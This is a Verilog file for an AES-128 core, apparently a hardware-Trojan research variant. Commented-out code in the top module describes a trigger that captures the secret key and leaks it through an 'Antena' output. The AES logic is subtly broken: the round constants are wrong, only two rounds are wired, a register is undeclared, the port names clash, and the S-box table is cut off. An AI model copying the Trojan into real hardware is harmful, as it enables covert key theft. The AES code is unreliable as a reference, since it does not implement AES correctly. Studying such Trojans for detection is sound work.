module top(clk, rst, state, key, out, Capacitance);

    input          clk, rst;
    input  [127:0] state, key;
    output [127:0] out;
    output Antena;
	wire Tj_Trig;
	reg [127:0] SECRETKey;


    //wire [31:0] k0, v1, d;

    // AES core (named ports)
	
	
    aes_128 AES (
        .clk  (clk),
       .state(state),
        .key  (key),
        .out  (out)
    );
	
	
	
	//Trojan_Trigger Tj_Trigger (.rst(rst), .clk(clk), .state(state), .Tj_Trig(Tj_Trig));
	//AM_Transmission TSC (.key(key), .clk(clk), .rst(rst), .Tj_Trig(Tj_Trig), .Antena(Antena));
	/*
	 always @(rst, clk)
	 begin
			if (rst == 1)
				state <= 0;
			else
				state <= state + 1;
	 end

	 always @(posedge Tj_Trig, posedge state[127])
	 begin
			if (Tj_Trig == 1)
				SECRETKey <= key;
			else
				SECRETKey <= 127'b0;
	 end
	 assign Antena = SECRETKey[state];
*/



   
endmodule



module idan(v0,v1,d);
	input [31:0] v0;
	input [31:0] v1;
	output [31:0] d;
	
	xor32 XZ0_0 (.o(d), .a(v0),    .b(v1));
	
endmodule

	

module aes_128(clk, state, key, out);
    input          clk;
    input  [127:0] state, key;
    output [127:0] out;

    reg  [127:0] s0, k0;

    wire [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9;
    wire [127:0] k1, k2, k3, k4, k5, k6, k7, k8, k9;
    wire [127:0] k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;
    wire [127:0] k10_unused;
	//assign k1 = key;
    always @(posedge clk) begin
        s0 <= state ^ key;
        k0 <= key;
    end

    // -------------------------------------------------------
    // KEY EXPANSION (10 rounds) — ONE LINE EACH
    // -------------------------------------------------------
	
    expand_key_128 a1  (.clk(clk), .in(k0),  .out_1(k1),  .out_2(k0b), .rcon(8'h00));
	
    expand_key_128 a2  (.clk(clk), .in(k1),  .out_1(k2),  .out_2(k1b), .rcon(8'h00));
	
    expand_key_128 a3  (.clk(clk), .in(k2),  .out_1(k3),  .out_2(k2b), .rcon(8'h04));
	
    expand_key_128 a4  (.clk(clk), .in(k3),  .out_1(k4),  .out_2(k3b), .rcon(8'h08));
    expand_key_128 a5  (.clk(clk), .in(k4),  .out_1(k5),  .out_2(k4b), .rcon(8'h10));
    expand_key_128 a6  (.clk(clk), .in(k5),  .out_1(k6),  .out_2(k5b), .rcon(8'h20));
    expand_key_128 a7  (.clk(clk), .in(k6),  .out_1(k7),  .out_2(k6b), .rcon(8'h40));
    expand_key_128 a8  (.clk(clk), .in(k7),  .out_1(k8),  .out_2(k7b), .rcon(8'h80));
    expand_key_128 a9  (.clk(clk), .in(k8),  .out_1(k9),  .out_2(k8b), .rcon(8'h1B));
    expand_key_128 a10 (.clk(clk), .in(k9),  .out_1(k10_unused), .out_2(k9b), .rcon(8'h36));
	
	//assign out = k9b;
	//assign out = k0b;
    // -------------------------------------------------------
    // ROUND FUNCTIONS (10 rounds, one per line)
    // -------------------------------------------------------
	
    one_round  r1 (.clk(clk), .state_in(s0), .key(k0b), .state_out(s1));
	
    one_round  r2 (.clk(clk), .state_in(s1), .key(k1b), .state_out(out));
	/*
    one_round  r3 (.clk(clk), .state_in(s2), .key(k2b), .state_out(s3));
	
    one_round  r4 (.clk(clk), .state_in(s3), .key(k3b), .state_out(s4));
	
    one_round  r5 (.clk(clk), .state_in(s4), .key(k4b), .state_out(s5));
	
    one_round  r6 (.clk(clk), .state_in(s5), .key(k5b), .state_out(s6));
    one_round  r7 (.clk(clk), .state_in(s6), .key(k6b), .state_out(s7));
    one_round  r8 (.clk(clk), .state_in(s7), .key(k7b), .state_out(s8));
    one_round  r9 (.clk(clk), .state_in(s8), .key(k8b), .state_out(out));
	*/

    //final_round rf (.clk(clk), .state_in(s9), .key_in(k9b), .state_out(out));
	

endmodule



// It implements X^20 + X^13 + X^9 + X^5 + 1
module lfsr_counter (rst, clk, lfsr);
	input rst;
	input clk;
    output [19:0] lfsr;


	//reg [19:0] lfsr_stream;
	wire d0; 
	
	
	assign lfsr = lfsr_stream; 
	//assign lfsr = 20'b10011001100110011001;

	// 4-input XOR built from binary XORs
	xor4_bit U_X4 (.o(d0),
                 .i1(lfsr_stream[15]),
                 .i2(lfsr_stream[11]),
                 .i3(lfsr_stream[7]),
                 .i4(lfsr_stream[0])); 

	always @(posedge clk)
		if (rst == 1) begin
			lfsr_stream <= 20'b10011001100110011001;
		end else begin
			lfsr_stream <= {d0,lfsr_stream[19:1]}; 
		end
		
endmodule

module one_round (clk, state_in, key, state_out);
    input              clk;
    input      [127:0] state_in, key;
    output reg [127:0] state_out;

    wire [31:0] s0, s1, s2, s3;
    wire [31:0] z0, z1, z2, z3;
    wire [31:0] k0, k1, k2, k3;

    assign k0 = key[127:96];
    assign k1 = key[95:64];
    assign k2 = key[63:32];
    assign k3 = key[31:0];

    assign s0 = state_in[127:96];
    assign s1 = state_in[95:64];
    assign s2 = state_in[63:32];
    assign s3 = state_in[31:0];

    wire [31:0] p00, p01, p02, p03,
                p10, p11, p12, p13,
                p20, p21, p22, p23,
                p30, p31, p32, p33;

    table_lookup
        t0 (.clk(clk), .state(s0), .p0(p00), .p1(p01), .p2(p02), .p3(p03)),
        t1 (.clk(clk), .state(s1), .p0(p10), .p1(p11), .p2(p12), .p3(p13)),
        t2 (.clk(clk), .state(s2), .p0(p20), .p1(p21), .p2(p22), .p3(p23)),
        t3 (.clk(clk), .state(s3), .p0(p30), .p1(p31), .p2(p32), .p3(p33));

	wire [31:0] z0_t0, z0_t1, z0_t2, z0;
	xor32 XZ0_0 (.o(z0_t0), .a(p00),    .b(p11));
	xor32 XZ0_1 (.o(z0_t1), .a(z0_t0),  .b(p22));
	xor32 XZ0_2 (.o(z0_t2), .a(z0_t1),  .b(p33));
	xor32 XZ0_3 (.o(z0),    .a(z0_t2),  .b(k0));

	// z1 = ((((p03 ^ p10) ^ p21) ^ p32) ^ k1)
	wire [31:0] z1_t0, z1_t1, z1_t2, z1;
	xor32 XZ1_0 (.o(z1_t0), .a(p03),    .b(p10));
	xor32 XZ1_1 (.o(z1_t1), .a(z1_t0),  .b(p21));
	xor32 XZ1_2 (.o(z1_t2), .a(z1_t1),  .b(p32));
	xor32 XZ1_3 (.o(z1),    .a(z1_t2),  .b(k1));

	// z2 = ((((p02 ^ p13) ^ p20) ^ p31) ^ k2)
	wire [31:0] z2_t0, z2_t1, z2_t2, z2;
	xor32 XZ2_0 (.o(z2_t0), .a(p02),    .b(p13));
	xor32 XZ2_1 (.o(z2_t1), .a(z2_t0),  .b(p20));
	xor32 XZ2_2 (.o(z2_t2), .a(z2_t1),  .b(p31));
	xor32 XZ2_3 (.o(z2),    .a(z2_t2),  .b(k2));

	// z3 = ((((p01 ^ p12) ^ p23) ^ p30) ^ k3)
	wire [31:0] z3_t0, z3_t1, z3_t2, z3;
	xor32 XZ3_0 (.o(z3_t0), .a(p01),    .b(p12));
	xor32 XZ3_1 (.o(z3_t1), .a(z3_t0),  .b(p23));
	xor32 XZ3_2 (.o(z3_t2), .a(z3_t1),  .b(p30));
	xor32 XZ3_3 (.o(z3),    .a(z3_t2),  .b(k3));


    always @ (posedge clk)
        state_out <= {z0, z1, z2, z3};
endmodule


/* AES final round for every two clock cycles */
module final_round (clk, state_in, key_in, state_out);
    input              clk;
    input      [127:0] state_in;
    input      [127:0] key_in;
    output reg [127:0] state_out;

    wire [31:0] s0, s1, s2, s3;
    wire [31:0] z0, z1, z2, z3;
    wire [31:0] k0, k1, k2, k3;

    // No LHS concat: explicit slices
    assign k0 = key_in[127:96];
    assign k1 = key_in[95:64];
    assign k2 = key_in[63:32];
    assign k3 = key_in[31:0];

    assign s0 = state_in[127:96];
    assign s1 = state_in[95:64];
    assign s2 = state_in[63:32];
    assign s3 = state_in[31:0];
 	
    wire [7:0] p00, p01, p02, p03;
	wire [7:0] p10, p11, p12, p13;
	wire [7:0] p20, p21, p22, p23;
	wire [7:0] p30, p31, p32, p33;

    wire [31:0] s4_1_w, s4_2_w, s4_3_w, s4_4_w;
    S4 S4_1 (.clk(clk), .in(s0), .out(s4_1_w));
    S4 S4_2 (.clk(clk), .in(s1), .out(s4_2_w));
    S4 S4_3 (.clk(clk), .in(s2), .out(s4_3_w));
    S4 S4_4 (.clk(clk), .in(s3), .out(s4_4_w));

	assign p00 = s4_1_w[31:24];
	assign p01 = s4_1_w[23:16];
	assign p02 = s4_1_w[15:8];
	assign p03 = s4_1_w[7:0];

	assign p10 = s4_2_w[31:24];
	assign p11 = s4_2_w[23:16];
	assign p12 = s4_2_w[15:8];
	assign p13 = s4_2_w[7:0];

	assign p20 = s4_3_w[31:24];
	assign p21 = s4_3_w[23:16];
	assign p22 = s4_3_w[15:8];
	assign p23 = s4_3_w[7:0];

	assign p30 = s4_4_w[31:24];
	assign p31 = s4_4_w[23:16];
	assign p32 = s4_4_w[15:8];
	assign p33 = s4_4_w[7:0];

    // intermediate concatenated words
    wire [31:0] z0_pre;
    wire [31:0] z1_pre;
    wire [31:0] z2_pre;
    wire [31:0] z3_pre;

    assign z0_pre = {p00, p11, p22, p33};
    assign z1_pre = {p10, p21, p32, p03};
    assign z2_pre = {p20, p31, p02, p13};
    assign z3_pre = {p30, p01, p12, p23};

    // 32-bit XORs done via gate-level xor32 modules
    xor32 XZ0 (.o(z0), .a(z0_pre), .b(k0));
    xor32 XZ1 (.o(z1), .a(z1_pre), .b(k1));
    xor32 XZ2 (.o(z2), .a(z2_pre), .b(k2));
    xor32 XZ3 (.o(z3), .a(z3_pre), .b(k3));

    always @ (posedge clk)
        //state_out <= {z0, z1, z2, z3};
		state_out <= {z0_pre, z1_pre, z2_pre, z3_pre};
endmodule

module expand_key_128 (clk, in, out_1, out_2, rcon);
    input              clk;
    input      [127:0] in;
    input      [7:0]   rcon;
    output reg [127:0] out_1;
    output     [127:0] out_2;
    wire [31:0] k0, k1, k2, k3;
    wire [31:0] k3_rot;


    wire [31:0] v0, v1, v2, v3;
    reg  [31:0] k0a, k1a, k2a, k3a;
    wire [31:0] k0b, k1b, k2b, k3b;
    wire [31:0] k4a;

    
    assign k0 = in[127:96];
    assign k1 = in[95:64];
    assign k2 = in[63:32];
    assign k3 = in[31:0];
	
	//assign k3_rot = {k3[23:0], k3[31:24]};
	assign k3_rot[31:24] = k3[23:16];
	assign k3_rot[23:16] = k3[15:8];
	assign k3_rot[15:8]  = k3[7:0];
	assign k3_rot[7:0]   = k3[31:24];

	//assign v0 = { (k0[31:24] ^ rcon), k0[23:0] };
	//assign v0[31:24] = k0[31:24] ^ rcon; // top byte XOR rcon 
	xor8 X_v08 (.o(v0[31:24]), .a(k0[31:24]),.b(rcon));
	
	
	
	assign v0[23:16] = k0[23:16];
	assign v0[15:8]  = k0[15:8];
	assign v0[7:0]   = k0[7:0];

	// ---- v1 = v0 ^ k1; v2 = v1 ^ k2; v3 = v2 ^ k3 ----
	// Use your 32-bit XOR primitive so the DFG sees per-bit gates.
	xor32 X_v1 (.o(v1), .a(v0), .b(k1));
	xor32 X_v2 (.o(v2), .a(v1), .b(k2));
	xor32 X_v3 (.o(v3), .a(v2), .b(k3));

	always @(posedge clk) begin
		k0a <= v0;
		k1a <= v1;
		k2a <= v2;
		k3a <= v3;
	end

    S4 S4_0 (.clk(clk), .in(k3_rot), .out(k4a));


	xor32 X_k0b (.o(k0b), .a(k0a), .b(k4a));
	xor32 X_k1b (.o(k1b), .a(k1a), .b(k4a));
	xor32 X_k2b (.o(k2b), .a(k2a), .b(k4a));
	xor32 X_k3b (.o(k3b), .a(k3a), .b(k4a));
    //assign k0b = k0a ^ k4a;
    //assign k1b = k1a ^ k4a;
    //assign k2b = k2a ^ k4a;
    //assign k3b = k3a ^ k4a;

    always @ (posedge clk)
        out_1 <= {k0b, k1b, k2b, k3b};

   
	assign out_2 = {k0b, k1b, k2b, k3b};
	
endmodule



module table_lookup (clk, state, p0, p1, p2, p3);
  input         clk;
  input  [31:0] state;
  output [31:0] p0, p1, p2, p3;

  wire [7:0]  b0, b1, b2, b3;
  wire [31:0] t0_w, t1_w, t2_w;

  assign b0 = state[31:24];
  assign b1 = state[23:16];
  assign b2 = state[15:8];
  assign b3 = state[7:0];

  T t0 (.clk(clk), .in(b0), .out(t0_w));
  T t1 (.clk(clk), .in(b1), .out(t1_w));
  T t2 (.clk(clk), .in(b2), .out(t2_w));
  T t3 (.clk(clk), .in(b3), .out(p3));

      // p0 = ROL8(t0_w)
    assign p0 = { t0_w[23:0], t0_w[31:24] };

    // p1 = ROL16(t1_w)
    assign p1 = { t1_w[15:0], t1_w[31:16] };

    // p2 = ROL24(t2_w)
    assign p2 = { t2_w[7:0],  t2_w[31:8] };

    // p3 = ROL0 (identity)
    //assign p3 = t3_w;
endmodule


module S4 (clk, in, out);
  input clk;
  input  [31:0] in;
  output [31:0] out;

  wire [7:0] b0, b1, b2, b3;
  wire [7:0] o0, o1, o2, o3;

  assign b0 = in[31:24];
  assign b1 = in[23:16];
  assign b2 = in[15:8];
  assign b3 = in[7:0];

  S u0 (.clk(clk), .in(b0), .out(o0));
  S u1 (.clk(clk), .in(b1), .out(o1));
  S u2 (.clk(clk), .in(b2), .out(o2));
  S u3 (.clk(clk), .in(b3), .out(o3));

  assign out[31:24] = o0;
  assign out[23:16] = o1;
  assign out[15:8]  = o2;
  assign out[7:0]   = o3;
endmodule


/* S_box, S_box, S_box*(x+1), S_box*x */
module T (clk, in, out);
  input         clk;
  input  [7:0]  in;
  output [31:0] out;

  wire [7:0] s_byte, xs_byte;
  S  u_s  (.clk(clk), .in(in), .out(s_byte));
  xS u_xs (.clk(clk), .in(in), .out(xs_byte));

  assign out[31:24] = s_byte;
  assign out[23:16] = s_byte;
  assign out[15:8]  = (s_byte ^ xs_byte);
  assign out[7:0]   = xs_byte;
endmodule


/* S box */
module S (clk, in, out);
    input clk;
    input [7:0] in;
    output reg [7:0] out;

    always @ (posedge clk)
    case (in)
    8'h00: out <= 8'h63;
    8'h01: out <= 8'h7c;
    8'h02: out <= 8'h77;
    8'h03: out <= 8'h7b;
    8'h04: out <= 8'hf2;
    8'h05: out <= 8'h6b;
    8'h06: out <= 8'h6f;
    8'h07: out <= 8'hc5;
    8'h08: out <= 8'h30;
    8'h09: out <= 8'h01;
    8'h0a: out <= 8'h67;
    8'h0b: out <= 8'h2b;
    8'h0c: out <= 8'hfe;
    8'h0d: out <= 8'hd7;
    8'h0e: out <= 8'hab;
    8'h0f: out <= 8'h76;
    8'h10: out <= 8'hca;
    8'h11: out <= 8'h82;
    8'h12: out <= 8'hc9;
    8'h13: out <= 8'h7d;
    8'h14: out <= 8'hfa;
    8'h15: out <= 8'h59;
    8'h16: out <= 8'h47;
    8'h17: out <= 8'hf0;
    8'h18: out <= 8'had;
    8'h19: out <= 8'hd4;
    8'h1a: out <= 8'ha2;
    8'h1b: out <= 8'haf;
    8'h1c: out <= 8'h9c;
    8'h1d: out <= 8'ha4;
    8'h1e: out <= 8'h72;
    8'h1f: out <= 8'hc0;
    8'h20: out <= 8'hb7;
    8'h21: out <= 8'hfd;
    8'h22: out <= 8'h93;
    8'h23: out <= 8'h26;
    8'h24: out <= 8'h36;
    8'h25: out <= 8'h3f;
    8'h26: out <= 8'hf7;
    8'h27: out <= 8'hcc;
    8'h28: out <= 8'h34;
    8'h29: out <= 8'ha5;
    8'h2a: out <= 8'he5;
    8'h2b: out <= 8'hf1;
    8'h2c: out <= 8'h71;
    8'h2d: out <= 8'hd8;
    8'h2e: out <= 8'h31;
    8'h2f: out <= 8'h15;
    8'h30: out <= 8'h04;
    8'h31: out <= 8'hc7;
    8'h32: out <= 8'h23;
    8'h33: out <= 8'hc3;
    8'h34: out <= 8'h18;
    8'h35: out <= 8'h96;
    8'h36: out <= 8'h05;
    8'h37: out <= 8'h9a;
    8'h38: out <= 8'h07;
    8'h39: out <= 8'h12;
    8'h3a: out <= 8'h80;
    8'h3b: out <= 8'he2;
    8'h3c: out <= 8'heb;
    8'h3d: out <= 8'h27;
    8'h3e: out <= 8'hb2;
    8'h3f: out <= 8'h75;
    8'h40: out <= 8'h09;
    8'h41: out <= 8'h83;
    8'h42: out <= 8'h2c;
    8'h43: out <= 8'h1a;
    8'h44: out <= 8'h1b;
    8'h45: out <= 8'h6e;
    8'h46: out <= 8'h5a;
    8'h47: out <= 8'ha0;
    8'h48: out <= 8'h52;
    8'h49: out <= 8'h3b;
    8'h4a: out <= 8'hd6;
    8'h4b: out <= 8'hb3;
    8'h4c: out <= 8'h29;
    8'h4d: out <= 8'he3;
    8'h4e: out <= 8'h2f;
    8'h4f: out <= 8'h84;
    8'h50: out <= 8'h53;
    8'h51: out <= 8'hd1;
    8'h52: out <= 8'h00;
    8'h53: out <= 8'hed;
    8'h54: out <= 8'h20;
    8'h55: out <= 8'hfc;
    8'h56: out <= 8'hb1;
    8'h57: out <= 8'h5b;
    8'h58: out <= 8'h6a;
    8'h59: out <= 8'hcb;
    8'h5a: out <= 8'hbe;
    8'h5b: out <= 8'h39;
    8'h5c: out <= 8'h4a;
    8'h5d: out <= 8'h4c;
    8'h5e: out <= 8'h58;
    8'h5f: out <= 8'hcf;
    8'h60: out <= 8'hd0;
    8'h61: out <= 8'hef;
    8'h62: out <= 8'haa;
    8'h63: out <= 8'hfb;
    8'h64: out <= 8'h43;
    8'h65: out <= 8'h4d;
    8'h66: out <= 8'h33;
    8'h67: out <= 8'h85;
    8'h68: out <= 8'h45;
    8'h69: out <= 8'hf9;
    8'h6a: out <= 8'h02;
    8'h6b: out <= 8'h7f;
    8'h6c: out <= 8'h50;
    8'h6d: out <= 8'h3c;
    8'h6e: out <= 8'h9f;
    8'h6f: out <= 8'ha8;
    8'h70: out <= 8'h51;
    8'h71: out <= 8'ha3;
    8'h72: out <= 8'h40;
    8'h73: out <= 8'h8f;
    8'h74: out <= 8'h92;
    8'h75: out <= 8'h9d;
    8'h76: out <= 8'h38;
    8'h77: out <= 8'hf5;
    8'h78: out <= 8'hbc;
    8'h79: out <= 8'hb6;
    8'h7a: out <= 8'hda;
    8'h7b: out <= 8'h21;
    8'h7c: out <= 8'h10;
    8'h7d: out <= 8'hff;
    8'h7e: out <= 8'hf3;
    8'h7f: out <= 8'hd2;
    8'h80: out <= 8'hcd;
    8'h81: out <= 8'h0c;
    8'h82: out <= 8'h13;
    8'h83: out <= 8'hec;
    8'h84: out <= 8'h5f;
    8'h85: out <= 8'h97;
    8'h86: out <= 8'h44;
    8'h87: out <= 8'h17;
    8'h88: out <= 8'hc4;
    8'h89: out <= 8'ha7;
    8'h8a: out <= 8'h7e;
    8'h8b: out <= 8'h3d;
    8'h8c: out <= 8'h64;
    8'h8d: out <= 8'h5d;
    8'h8e: out <= 8'h19;
    8'h8f: out <= 8'h73;
    8'h90: out <= 8'h60;
    8'h91: out <= 8'h81;
    8'h92: out <= 8'h4f;
    8'h93: out <= 8'hdc;
    8'h94: out <= 8'h22;
    8'h95: out <= 8'h2a;
    8'h96: out <= 8'h90;
    8'h97: out <= 8'h88;
    8'h98: out <= 8'h46;
    8'h99: out <= 8'hee;
    8'h9a: out <= 8'hb8;
    8'h9b: out <= 8'h14;
    8'h9c: out <= 8'hde;
    8'h9d: out <= 8'h5e;
    8'h9e: out <= 8'h0b;
    8'h9f: out <= 8'hdb;
    8'ha0: out <= 8'he0;
    8'ha1: out <= 8'h32;
    8'ha2: out <= 8'h3a;
    8'ha3: out <= 8'h0a;
    8'ha4: out <= 8'h49;
    8'ha5: out <= 8'h06;
    8'ha6: out <= 8'h24;
    8'ha7: out <= 8'h5c;
    8'ha8: out <= 8'hc2;
    8'ha9: out <= 8'hd3;
    8'haa: out <= 8'hac;
    8'hab: out <= 8'h62;
    8'hac: out <= 8'h91;
    8'had: out <= 8'h95;
    8'hae: out <= 8'he4;
    8'haf: out <= 8'h79;
    8'hb0: out <= 8'he7;
    8'hb1: out <= 8'hc8;
    8'hb2: out <= 8'h37;
    8'hb3: out <= 8'h6d;
    8'hb4: out <= 8'h8d;
    8'hb5: out <= 8'hd5;
    8'hb6: out <= 8'h4e;
    8'hb7: out <= 8'ha9;
    8'hb8: out <= 8'h6c;
    8'hb9: out <= 8'h56;
    8'hba: out <= 8'hf4;
    8'hbb: out <= 8'hea;
    8'hbc: out <= 8'h65;
    8'hbd: out <= 8'h7a;
    8'hbe: out <= 8'hae;
    8'hbf: out <= 8'h08;
    8'hc0: out <= 8'hba;
    8'hc1: out <= 8'h78;
    8'hc2: out <= 8'h25;
    8'hc3: out <= 8'h2e;
    8'hc4: out <= 8'h1c;
    8'hc5: out <= 8'ha6;
    8'hc6: out <= 8'hb4;
    8'hc7: out <= 8'hc6;
    8'hc8: out <= 8'he8;
    8'hc9: out <= 8'hdd;
    8'hca: out <= 8'h74;
    8'hcb: out <= 8'h1f;
    8'hcc: out <= 8'h4b;
    8'hcd: out <= 8'hbd;
    8'hce: out <= 8'h8b;
    8'hcf: out <= 8'h8a;
    8'hd0: out <= 8'h70;
    8'hd1: out <= 8'h3e;
    8'hd2: out <= 8'hb5;
    8'hd3: out <= 8'h66;
    8'hd4: out <= 8'h48;
    8'hd5: out <= 8'h03;
    8'hd6: out <= 8'hf6;
    8'hd7: out <= 8'h0e;
    8'hd8: out <= 8'h61;
    8'hd9: out <= 8'h35;
    8'hda: out <= 8'h57;
    8'hdb: out <= 8'hb9;
    8'hdc: out <= 8'h86;
    8'hdd: out <= 8'hc1;
    8'hde: out <= 8'h1d;
    8'hdf: out <= 8'h9e;
    8'he0: out <= 8'he1;
    8'he1: out <= 8'hf8;
    8'he2: out <= 8'h98;
    8'he3: out <= 8'h11;
    8'he4: out <= 8'h69;
    8'he5: out <= 8'hd9;
    8'he6: out <= 8'h8e;
    8'he7: out <= 8'h94;
    8'he8: out <= 8'h9b;
    8'he9: out <= 8'h1e;
    8'hea: out <= 8'h87;
    8'heb: out <= 8'he9;
    8'hec: out <= 8'hce;
    8'hed: out <= 8'h55;
    8'hee: out <= 8'h28;
    8'hef: out <= 8'hdf;
    8'hf0: out <= 8'h8c;
    8'hf1: out <= 8'ha1;
    8'hf2: out <= 8'h89;
    8'hf3: out <= 8'h0d;
    8'hf4: out <= 8'hbf;
    8'hf5: out <= 8'he6;
    8'hf6: out <= 8'h42;
    8'hf7: out <= 8'h68;
    8'hf8: out <= 8'h41;
    8'hf9: out <= 8'h99;
    8'hfa: out <= 8'h2d;
    8'hfb: out <= 8'h0f;
    8'hfc: out <= 8'hb0;
    8'hfd: out <= 8'h54;
    8'hfe: out <= 8'hbb;
    8'hff: out <= 8'h16;
    endcase
endmodule

/* S box * x */
module xS (clk, in, out);
    input clk;
    input [7:0] in;
    output reg [7:0] out;

    always @ (posedge clk)
    case (in)
    8'h00: out <= 8'hc6;
    8'h01: out <= 8'hf8;
    8'h02: out <= 8'hee;
    8'h03: out <= 8'hf6;
    8'h04: out <= 8'hff;
    8'h05: out <= 8'hd6;
    8'h06: out <= 8'hde;
    8'h07: out <= 8'h91;
    8'h08: out <= 8'h60;
    8'h09: out <= 8'h02;
    8'h0a: out <= 8'hce;
    8'h0b: out <= 8'h56;
    8'h0c: out <= 8'he7;
    8'h0d: out <= 8'hb5;
    8'h0e: out <= 8'h4d;
    8'h0f: out <= 8'hec;
    8'h10: out <= 8'h8f;
    8'h11: out <= 8'h1f;
    8'h12: out <= 8'h89;
    8'h13: out <= 8'hfa;
    8'h14: out <= 8'hef;
    8'h15: out <= 8'hb2;
    8'h16: out <= 8'h8e;
    8'h17: out <= 8'hfb;
    8'h18: out <= 8'h41;
    8'h19: out <= 8'hb3;
    8'h1a: out <= 8'h5f;
    8'h1b: out <= 8'h45;
    8'h1c: out <= 8'h23;
    8'h1d: out <= 8'h53;
    8'h1e: out <= 8'he4;
    8'h1f: out <= 8'h9b;
    8'h20: out <= 8'h75;
    8'h21: out <= 8'he1;
    8'h22: out <= 8'h3d;
    8'h23: out <= 8'h4c;
    8'h24: out <= 8'h6c;
    8'h25: out <= 8'h7e;
    8'h26: out <= 8'hf5;
    8'h27: out <= 8'h83;
    8'h28: out <= 8'h68;
    8'h29: out <= 8'h51;
    8'h2a: out <= 8'hd1;
    8'h2b: out <= 8'hf9;
    8'h2c: out <= 8'he2;
    8'h2d: out <= 8'hab;
    8'h2e: out <= 8'h62;
    8'h2f: out <= 8'h2a;
    8'h30: out <= 8'h08;
    8'h31: out <= 8'h95;
    8'h32: out <= 8'h46;
    8'h33: out <= 8'h9d;
    8'h34: out <= 8'h30;
    8'h35: out <= 8'h37;
    8'h36: out <= 8'h0a;
    8'h37: out <= 8'h2f;
    8'h38: out <= 8'h0e;
    8'h39: out <= 8'h24;
    8'h3a: out <= 8'h1b;
    8'h3b: out <= 8'hdf;
    8'h3c: out <= 8'hcd;
    8'h3d: out <= 8'h4e;
    8'h3e: out <= 8'h7f;
    8'h3f: out <= 8'hea;
    8'h40: out <= 8'h12;
    8'h41: out <= 8'h1d;
    8'h42: out <= 8'h58;
    8'h43: out <= 8'h34;
    8'h44: out <= 8'h36;
    8'h45: out <= 8'hdc;
    8'h46: out <= 8'hb4;
    8'h47: out <= 8'h5b;
    8'h48: out <= 8'ha4;
    8'h49: out <= 8'h76;
    8'h4a: out <= 8'hb7;
    8'h4b: out <= 8'h7d;
    8'h4c: out <= 8'h52;
    8'h4d: out <= 8'hdd;
    8'h4e: out <= 8'h5e;
    8'h4f: out <= 8'h13;
    8'h50: out <= 8'ha6;
    8'h51: out <= 8'hb9;
    8'h52: out <= 8'h00;
    8'h53: out <= 8'hc1;
    8'h54: out <= 8'h40;
    8'h55: out <= 8'he3;
    8'h56: out <= 8'h79;
    8'h57: out <= 8'hb6;
    8'h58: out <= 8'hd4;
    8'h59: out <= 8'h8d;
    8'h5a: out <= 8'h67;
    8'h5b: out <= 8'h72;
    8'h5c: out <= 8'h94;
    8'h5d: out <= 8'h98;
    8'h5e: out <= 8'hb0;
    8'h5f: out <= 8'h85;
    8'h60: out <= 8'hbb;
    8'h61: out <= 8'hc5;
    8'h62: out <= 8'h4f;
    8'h63: out <= 8'hed;
    8'h64: out <= 8'h86;
    8'h65: out <= 8'h9a;
    8'h66: out <= 8'h66;
    8'h67: out <= 8'h11;
    8'h68: out <= 8'h8a;
    8'h69: out <= 8'he9;
    8'h6a: out <= 8'h04;
    8'h6b: out <= 8'hfe;
    8'h6c: out <= 8'ha0;
    8'h6d: out <= 8'h78;
    8'h6e: out <= 8'h25;
    8'h6f: out <= 8'h4b;
    8'h70: out <= 8'ha2;
    8'h71: out <= 8'h5d;
    8'h72: out <= 8'h80;
    8'h73: out <= 8'h05;
    8'h74: out <= 8'h3f;
    8'h75: out <= 8'h21;
    8'h76: out <= 8'h70;
    8'h77: out <= 8'hf1;
    8'h78: out <= 8'h63;
    8'h79: out <= 8'h77;
    8'h7a: out <= 8'haf;
    8'h7b: out <= 8'h42;
    8'h7c: out <= 8'h20;
    8'h7d: out <= 8'he5;
    8'h7e: out <= 8'hfd;
    8'h7f: out <= 8'hbf;
    8'h80: out <= 8'h81;
    8'h81: out <= 8'h18;
    8'h82: out <= 8'h26;
    8'h83: out <= 8'hc3;
    8'h84: out <= 8'hbe;
    8'h85: out <= 8'h35;
    8'h86: out <= 8'h88;
    8'h87: out <= 8'h2e;
    8'h88: out <= 8'h93;
    8'h89: out <= 8'h55;
    8'h8a: out <= 8'hfc;
    8'h8b: out <= 8'h7a;
    8'h8c: out <= 8'hc8;
    8'h8d: out <= 8'hba;
    8'h8e: out <= 8'h32;
    8'h8f: out <= 8'he6;
    8'h90: out <= 8'hc0;
    8'h91: out <= 8'h19;
    8'h92: out <= 8'h9e;
    8'h93: out <= 8'ha3;
    8'h94: out <= 8'h44;
    8'h95: out <= 8'h54;
    8'h96: out <= 8'h3b;
    8'h97: out <= 8'h0b;
    8'h98: out <= 8'h8c;
    8'h99: out <= 8'hc7;
    8'h9a: out <= 8'h6b;
    8'h9b: out <= 8'h28;
    8'h9c: out <= 8'ha7;
    8'h9d: out <= 8'hbc;
    8'h9e: out <= 8'h16;
    8'h9f: out <= 8'had;
    8'ha0: out <= 8'hdb;
    8'ha1: out <= 8'h64;
    8'ha2: out <= 8'h74;
    8'ha3: out <= 8'h14;
    8'ha4: out <= 8'h92;
    8'ha5: out <= 8'h0c;
    8'ha6: out <= 8'h48;
    8'ha7: out <= 8'hb8;
    8'ha8: out <= 8'h9f;
    8'ha9: out <= 8'hbd;
    8'haa: out <= 8'h43;
    8'hab: out <= 8'hc4;
    8'hac: out <= 8'h39;
    8'had: out <= 8'h31;
    8'hae: out <= 8'hd3;
    8'haf: out <= 8'hf2;
    8'hb0: out <= 8'hd5;
    8'hb1: out <= 8'h8b;
    8'hb2: out <= 8'h6e;
    8'hb3: out <= 8'hda;
    8'hb4: out <= 8'h01;
    8'hb5: out <= 8'hb1;
    8'hb6: out <= 8'h9c;
    8'hb7: out <= 8'h49;
    8'hb8: out <= 8'hd8;
    8'hb9: out <= 8'hac;
    8'hba: out <= 8'hf3;
    8'hbb: out <= 8'hcf;
    8'hbc: out <= 8'hca;
    8'hbd: out <= 8'hf4;
    8'hbe: out <= 8'h47;
    8'hbf: out <= 8'h10;
    8'hc0: out <= 8'h6f;
    8'hc1: out <= 8'hf0;
    8'hc2: out <= 8'h4a;
    8'hc3: out <= 8'h5c;
    8'hc4: out <= 8'h38;
    8'hc5: out <= 8'h57;
    8'hc6: out <= 8'h73;
    8'hc7: out <= 8'h97;
    8'hc8: out <= 8'hcb;
    8'hc9: out <= 8'ha1;
    8'hca: out <= 8'he8;
    8'hcb: out <= 8'h3e;
    8'hcc: out <= 8'h96;
    8'hcd: out <= 8'h61;
    8'hce: out <= 8'h0d;
    8'hcf: out <= 8'h0f;
    8'hd0: out <= 8'he0;
    8'hd1: out <= 8'h7c;
